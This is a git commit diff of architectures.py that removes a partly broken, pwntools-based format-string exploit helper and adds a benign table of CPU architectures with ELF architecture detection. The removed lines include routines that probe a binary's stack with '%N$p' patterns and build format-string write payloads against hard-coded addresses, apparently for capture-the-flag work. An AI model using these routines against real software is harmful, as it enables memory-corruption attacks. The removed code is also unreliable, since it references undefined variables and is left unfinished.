f0b4c471cfb733cb7143e0318d4849d5e481c492
salmon <947270280@qq.com>
2017-09-17 20:27:04 +0800

    Update architectures.py

--- architectures.py
+++ architectures.py
@@ -1,217 +1,111 @@
 #!/usr/bin/env python3
-import sys
-import struct
-import time
-import os
-from pwn import process, p32
-import tempfile
-
-from architectures import local_arch, x86_32
-from payloads import *
 
 
-def make_pattern(buffer_size, start_offset=1):
+def struct_fmt(size, signed=False):
     '''
-    Generate a pattern to get the offset of your buffer
+    Helper that returns the format for struct.pack, given a size and
+    a signedness
 
-    Args:
-        buffer_size (int): The maximum size of your buffer
-        start_offset (int): The starting offset
-
-    Returns:
-        A pattern for the format string
+    >>> struct_fmt(4, False)
+    'I'
+    >>> struct_fmt(8, True)
+    'q'
     '''
-    pattern = 'AAAABBBB'
-    offset = start_offset
+    formats = {1: 'b', 2: 'h', 4: 'i', 8: 'q'}
+    assert size in formats, 'unknown size'
 
-    while True:
-        fmt = '|%%%d$p' % offset
-        if len(pattern) + len(fmt) > buffer_size:
-            break
-
-        pattern += fmt
-        offset += 1
-
-    return pattern
+    if not signed:
+        return formats[size].upper()
+    else:
+        return formats[size]
 
 
-def compute_offset(buffer, start_offset=1, arch=x86_32):
-    '''
-    Compute the offset of your buffer given the result of make_pattern
+class Architecture:
+    def __init__(self, name, bits, endian):
+        assert bits >= 1
+        assert endian in ('little', 'big')
 
-    Args:
-        buffer (string): The result of make_pattern
-        start_offset (int): The starting offset
-        arch (Architecture): The architecture of your system
+        self.name = name
+        self.bits = bits
+        self.endian = endian
 
-    Returns:
-        False if the offset is not found
-        Otherwise, returns the couple (offset, padding)
-    '''
-    arch = arch
+    @property
+    def bytes(self):
+        return self.bits // 8
 
-    buffer = buffer.replace('(nil)', '0x0')
+    # format for struct
 
+    @property
+    def endian_fmt(self):
+        return '<' if self.endian == 'little' else '>'
 
-    if 'AAAABBBB' in buffer:
-        memory = buffer[buffer.index('AAAABBBB') : ]
+    @property
+    def address_fmt(self):
+        return self.endian_fmt + struct_fmt(self.bytes, False)
 
-
-    memory = memory.split('|')
-    if memory[0] == 'AAAABBBB':
-        memory = memory[1:]
-
-    
-    memory = map(lambda x: struct.pack(arch.address_fmt, int(x, 16)),
-                 memory[ : -1])
-    memory = b''.join(memory)
-
-    for i in range(len(buffer)):
-        if memory[i:i + 10] == b'AAAABBBB|%':
-            if i % arch.bytes == 0:
-                return (start_offset + i // arch.bytes, 0)
-            else:
-                return (start_offset + i // arch.bytes + 1,
-                        arch.bytes - i % arch.bytes)
-
-    return False # not found
-
-# find main ret and replace with write* fucntions when read memory with a "[Result]:" format
-def find_mainret(binary):
-    # ff 54 24 60 call main
-    lname = "/tmp/mainret-".format(os.path.basename(binary))
-    cmd = "objdump -d {} | grep 'ff 54 24 60' > {}".format(binary, lname )
-    os.system(cmd)
-    try:
-        if output:
-            mainret = int(output.strip().split(':')[0], 16) + 4
-            print("main ret:", hex(mainret))
-    except:
-        return False
-   
-
-def get_offset(binary):
-    p = process(binary)
-    p.send(make_pattern(1024))
-    time.sleep(1)
-    recvdata = p.recv()
-    print recvdata
-    (offset, offset2) = compute_offset(recvdata)
-    if offset2:
-        return False
-    return offset
+    def __repr__(self):
+        return '<%s (%d bits, %s endian)>' % (self.name,
+                                              self.bits,
+                                              self.endian)
 
 
-# not useful now
-def read_addr(binary, addr):
+archs = {}
+aarch64 = archs['aarch64'] = Architecture('aarch64', 64, 'little')
+alpha = archs['alpha'] = Architecture('alpha', 64, 'little')
+avr = archs['avr'] = Architecture('avr', 8, 'little')
+amd64 = archs['amd64'] = Architecture('amd64', 64, 'little')
+arm = archs['arm'] = Architecture('arm', 32, 'little')
+cris = archs['cris'] = Architecture('cris', 32, 'little')
+i386 = archs['i386'] = Architecture('i386', 32, 'little')
+ia64 = archs['ia64'] = Architecture('ia64', 64, 'big')
+m68k = archs['m68k'] = Architecture('m68k', 32, 'big')
+mips = archs['mips'] = Architecture('mips', 32, 'little')
+mips64 = archs['mips64'] = Architecture('mips64', 64, 'little')
+msp430 = archs['msp430'] = Architecture('msp430', 16, 'little')
+powerpc = archs['powerpc'] = Architecture('powerpc', 32, 'big')
+powerpc64 = archs['powerpc64'] = Architecture('powerpc64', 64, 'big')
+s390 = archs['s390'] = Architecture('s390', 32, 'big')
+sparc = archs['sparc'] = Architecture('sparc', 32, 'big')
+sparc64 = archs['sparc64'] = Architecture('sparc64', 64, 'big')
+thumb = archs['thumb'] = Architecture('thumb', 32, 'little')
+vax = archs['vax'] = Architecture('vax', 32, 'little')
 
-    import functions
-    f  = functions.functions()
-    write_function = f.functions['write', None]
-    if not write_function:
-        write_function = f.functions['puts', None]
-    if not write_function:
-        write_function = f.functions['printf', None]
-   
-
-    if not write_function:
-        #return False
-        write_function = 0x080483B0
-
-    offset = get_offset(binary)
-    if not offset:
-        return False
-
-    settings = PayloadSettings(offset=offset, arch=x86_32)
-    wp = WritePayload()
-
-    count = 0
-    fmtpayload = ""
-    pad = ""
-    while count < 100:
-        try:
-            pad = b' ' * count  + b'[Result]:'
-            start_buffer_addr = addr - len(pad)
-            
-            wp[start_buffer_addr] = pad
-            #wp[addr] = struct.pack('@I', 0x41424344)
-            fmtpayload = wp.generate(settings)
-            open('ans','wb').write(fmtpayload)
-            print hex(start_buffer_addr), repr(pad)
-            print repr(fmtpayload)
-            #raw_input("continue")
-            #p.send(fmtpayload)
-            break
-        except:
-            count += 1
+# for convenience
+x86_32 = archs['x86_32'] = Architecture('x86_32', 32, 'little')
+x86_64 = archs['x86_64'] = Architecture('x86_64', 64, 'little')
 
 
-    # write to ret of main with write function
-    if fmtpayload:
-        eippayload = p32(write_function) + p32(start_buffer_addr) + p32(len(pad) + 4)
+def local_arch():
+    import platform
 
-        main_addr = find_mainret(binary)
-        if not main_addr:
-            #return False
-            main_addr = 0x0804A040
-
-        print "main addr:", hex(main_addr)
-        # find an eip offset > main
-        offset = 0
-        while offset < 1024:
-            p = process(binary)
-            tp = make_pattern(14, offset)
-            
-            p.send(tp)
-            time.sleep(0.1)
-            recvdata = p.recv()
-            
-            paddr = '|0x80'
-            if paddr in recvdata:
-                print tp
-                print recvdata
-                try:
-                    addr = recvdata[recvdata.index(paddr) + 1 : recvdata.index(paddr) + len(paddr) + 5]
-
-                    if int(addr, 16) == 0x0804A040:
-                        print "offset", offset
-                        break
-                except:
-                    pass
-
-            offset += 1
-
-        # write payload to main_ret according offset, need stack
-        if offset:
-            pass
-            #TODO
+    assert platform.machine() in archs, 'unknown architecture'
+    return archs[platform.machine()]
 
 
+def binary_arch(path):
+    from elftools.elf.elffile import ELFFile
 
-def write_addr_content(binary, addr, content):
+    with open(path, 'rb') as f:
+        elf = ELFFile(f)
 
-    fmtpayload = ""
-    offset = get_offset(binary)
-    if not offset:
-        return False
-        
-    settings = PayloadSettings(offset=offset, arch=x86_32)
-    wp = WritePayload()
-   
-    #wp[addr] = struct.pack('@I', 0x41424344)
-    wp[addr] = struct.pack('@I', content)
-    fmtpayload = wp.generate(settings)
-    print ("payload", repr(fmtpayload))
-    return fmtpayload
+        name = {
+            'EM_X86_64': 'amd64',
+            'EM_386': 'i386',
+            'EM_486': 'i386',
+            'EM_ARM': 'arm',
+            'EM_AARCH64': 'aarch64',
+            'EM_MIPS': 'mips',
+            'EM_PPC': 'powerpc',
+            'EM_PPC64': 'powerpc64',
+            'EM_SPARC32PLUS': 'sparc',
+            'EM_SPARCV9': 'sparc64',
+            'EM_IA_64': 'ia64'
+        }.get(elf['e_machine'], elf['e_machine'])
+        bits = elf.elfclass
+        endian = {
+            'ELFDATANONE': 'little',
+            'ELFDATA2LSB': 'little',
+            'ELFDATA2MSB': 'big'
+        }[elf['e_ident']['EI_DATA']]
 
-
-def test():
-
-    binary = sys.argv[1]
-    #read_addr(binary, 0x0804A040)
-    write_addr_content(binary, 0x0804A040, 0x41424344)
-
-if __name__ == '__main__':
-    test()
-
-
+        return Architecture(name, bits, endian)
